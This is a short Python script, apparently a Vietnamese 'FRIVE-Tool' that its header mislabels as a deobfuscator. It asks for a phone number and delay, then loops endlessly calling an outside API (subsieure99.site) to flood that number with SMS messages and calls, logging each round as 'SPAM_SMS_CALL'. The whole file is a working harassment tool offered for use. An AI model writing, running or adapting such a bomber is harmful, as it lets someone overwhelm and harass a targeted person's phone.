'''Deobfuscator by HuyAnh
Zalo: 0905491417
fb: huyanhnong.21



'''
import os, json, sys, requests
from time import sleep
from datetime import datetime
from datetime import date
from pystyle import Write,Colors

os.system("cls" if os.name == "nt" else "clear")
logo=f"""Copyright © FRIVE-Tool 2023 | Version 1.1\n"""
Write.Print('   ███████╗██████╗ ██╗██╗   ██╗███████╗\n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print('   ██╔════╝██╔══██╗██║██║   ██║██╔════╝\n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print('   █████╗  ██████╔╝██║██║   ██║█████╗  \n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print('   ██╔══╝  ██╔══██╗██║╚██╗ ██╔╝██╔══╝  \n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print('   ██║     ██║  ██║██║ ╚████╔╝ ███████╗\n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print('   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝\n',Colors.green_to_red,interval=0.0001,end='\r')
Write.Print(logo,Colors.red_to_yellow,interval=0.0001,end='\n')

sdt = str(Write.Input(f'Vui Lòng Nhập SDT: ',Colors.green_to_red,interval=0.0001))
delay = int(Write.Input(f'Nhập Delay: ',Colors.red_to_yellow,interval=0.0001))
stt=0

while True:
	stt+=1
	time=datetime.now().strftime("%H:%M:%S")
	string = requests.get(f"https://subsieure99.site/api/api.php?phone={sdt}").json()
	Write.Print(f'[{stt}] | [{time}] | [SPAM_SMS_CALL] | [{sdt}] |\n',Colors.red_to_yellow,interval=0.0001,end='\r')
	for i in range(delay,0,-1):
		Write.Print(f'Tiếp Tục Spam Sau {i} giây ',Colors.green_to_cyan,interval=0.0001,end='\r')
		sleep(1)